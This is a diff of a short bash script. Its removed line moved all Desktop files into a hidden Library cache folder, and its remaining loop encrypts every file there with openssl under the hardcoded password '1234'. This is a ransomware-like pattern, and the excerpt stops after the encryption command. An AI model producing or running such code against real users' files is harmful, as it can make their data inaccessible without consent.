@@ -1,8 +1,7 @@
 #!/bin/bash
 cd ~
-DIR="./Library/ZorgV/Cache"
+DIR="./Library/IChicken/Cache"
 PASSWORD="1234"
-mv ~/Desktop/* ~/Library/ZorgV/Cache/
 find "$DIR" -type f ! -name "*.encrypted" | while read -r file; do
     enc_file="${file}.encrypted"
     openssl enc -aes-256-cbc -salt -in "$file" -out "$enc_file" -pass pass:"$PASSWORD"
